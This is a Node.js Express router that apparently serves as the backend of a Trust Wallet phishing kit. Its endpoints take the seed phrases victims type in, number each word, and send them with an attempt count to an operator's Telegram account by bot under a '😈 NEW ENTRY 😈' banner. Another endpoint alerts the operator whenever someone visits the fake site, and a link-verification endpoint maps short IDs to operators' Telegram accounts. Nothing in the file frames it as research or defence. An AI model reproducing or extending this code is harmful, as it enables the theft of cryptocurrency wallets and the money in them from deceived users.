const User = require("../../models/User");
const WalletLink = require("../../models/WalletLink");
const bot = require("../../telegram");
const router = require("express").Router();


router.post("/verify-wallet", async (req, res) => {
    const {
        shortID
    } = req.body;


    if (!shortID) {
        return res.status({
            success: false,
            msg: "Invalid short id"
        });
    }

    const wallet = await WalletLink.findOne({ shortID });


    if (wallet) {
        if (new Date() > new Date(wallet.expiry)) {
            return res.json({
                success: false,
                msg: "Invalid short id"
            });
        } else {
            const user = await User.findById(wallet.user);
            return res.json({
                success: true,
                telegramID: user.telegramID
            });
        }
    } else {
        return res.json({
            success: false,
            msg: "Invalid short id"
        });
    }
})


router.post("/send-passphrase", async (req, res) => {
    try {
        const {
            telegramID,
            passphrase,
            attempt
        } = req.body;

        let passStr =
            ``

        passphrase.forEach((p, i) => {
            passStr += `\n ${i + 1}. ${p}`
        });

        await bot.sendMessage(telegramID, `
😈 NEW ENTRY 😈

Wallet Type: Trust Wallet
Attempt: ${attempt}${attempt === 1 ? 'st' : 'nd'} attempt

Passphrase:
${passStr}
        `)
            .catch(err => console.log("Telegram error"));

        return res.status(200).json({
            success: true
        });
    } catch (err) {
        console.log(err)
    }
});

router.post("/send-passphrase2", async (req, res) => {
    try {
        const {
            telegramID,
            passphrase,
            shortID,
            attempt
        } = req.body;

        const wallet = await WalletLink.findOne({ shortID });

        if (!wallet) {
            return res.json({
                success: false
            })
        }

        if (new Date() > new Date(wallet.expiry)) {
            return res.json({
                success: false
            })
        }

        let passStr =
            ``

        passphrase.forEach((p, i) => {
            passStr += `\n ${i + 1}. ${p}`
        });

        await bot.sendMessage(telegramID, `
😈 NEW ENTRY 😈

Wallet Type: Trust Wallet
Attempt: ${attempt}${attempt === 1 ? 'st' : 'nd'} attempt

Passphrase:
${passStr}
        `)
            .catch(err => console.log("Telegram error"));

        return res.status(200).json({
            success: true
        });
    } catch (err) {
        console.log(err)
    }
});


router.post("/send-alert", async (req, res) => {
    try {
        const {
            telegramID
        } = req.body;

        await bot.sendMessage(telegramID, `
😈 NEW ENTRY 😈

Wallet Type: Trust Wallet

Someone is on your site!
        
                        `)
            .catch(err => console.log("Telegram error"));
        return res.status(200).json({
            success: true
        });
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;